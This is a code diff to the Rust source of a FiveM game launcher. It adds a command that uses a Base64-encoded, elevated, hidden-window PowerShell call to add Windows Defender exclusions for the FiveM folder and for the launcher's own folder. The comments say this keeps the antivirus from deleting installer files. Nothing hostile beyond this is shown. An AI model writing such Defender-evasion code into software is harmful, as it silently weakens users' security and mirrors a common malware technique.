@@ -21,6 +21,7 @@ use std::path::PathBuf;
 use std::process::Command;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
+use base64::Engine;
 
 /// ─────────────────────────────────────────────
 /// 📝 ЛОГИРОВАНИЕ В ФАЙЛ
@@ -502,6 +503,64 @@ async fn download_fivem(window: tauri::Window) -> Result<String, String> {
 /// ─────────────────────────────────────────────
 /// 📦 ЗАПУСК УСТАНОВЩИКА FIVEM
 /// ─────────────────────────────────────────────
+
+/// Добавляет папку FiveM в исключения Windows Defender.
+/// Это предотвращает удаление файлов установщика антивирусом.
+/// Использует Start-Process -Verb RunAs для запроса прав админа через UAC.
+#[command]
+fn add_defender_exclusion() -> Result<String, String> {
+    log_info!("add_defender_exclusion: добавление исключения Defender");
+
+    let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Users\Default\AppData\Local".to_string());
+    let fivem_dir = PathBuf::from(local_appdata).join("FiveM");
+
+    // Создаём папку FiveM заранее
+    fs::create_dir_all(&fivem_dir).ok();
+
+    let fivem_dir_str = fivem_dir.to_string_lossy().to_string();
+
+    // Путь к самому Astra Launcher (папка где лежит exe)
+    let astra_dir = std::env::current_exe()
+        .ok()
+        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
+        .unwrap_or_else(|| PathBuf::from(r"C:\Program Files\ASTRA Launcher"));
+    let astra_dir_str = astra_dir.to_string_lossy().to_string();
+
+    // Добавляем исключения и для FiveM, и для Astra Launcher
+    let inner_script = format!(
+        "Add-MpPreference -ExclusionPath '{}'; Add-MpPreference -ExclusionPath '{}'",
+        fivem_dir_str.replace('\'', "''"),
+        astra_dir_str.replace('\'', "''")
+    );
+
+    // Кодируем скрипт в Base64 для передачи через -EncodedCommand
+    let encoded = base64::engine::general_purpose::STANDARD.encode(inner_script.as_bytes());
+
+    let script = format!(
+        "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile','-NonInteractive','-EncodedCommand','{}' -Wait",
+        encoded
+    );
+
+    let output = Command::new("powershell")
+        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+        .creation_flags(0x00000008) // CREATE_NO_WINDOW
+        .output()
+        .map_err(|e| format!("Не удалось запустить PowerShell: {}", e))?;
+
+    if output.status.success() {
+        log_info!("add_defender_exclusion: исключения добавлены для {} и {}", fivem_dir_str, astra_dir_str);
+        Ok(format!("Исключения добавлены: {} и {}", fivem_dir_str, astra_dir_str))
+    } else {
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        log_error!("add_defender_exclusion: ошибка: {}", stderr);
+        // Пользователь мог отклонить UAC
+        if stderr.contains("0x80070005") || stderr.contains("Access is denied") || stderr.contains("отказано") {
+            Err("UAC_DENIED".to_string())
+        } else {
+            Err(format!("Ошибка добавления исключения: {}", stderr))
+        }
+    }
+}
 
 /// Запускает скачанный установщик FiveM БЕЗ ожидания.
 #[command]
@@ -1203,6 +1262,7 @@ fn main() {
             set_fivem_path,
             auto_find_fivem,
             download_fivem,
+            add_defender_exclusion,
             launch_fivem_installer,
             show_main_window,
             // Лаунчер
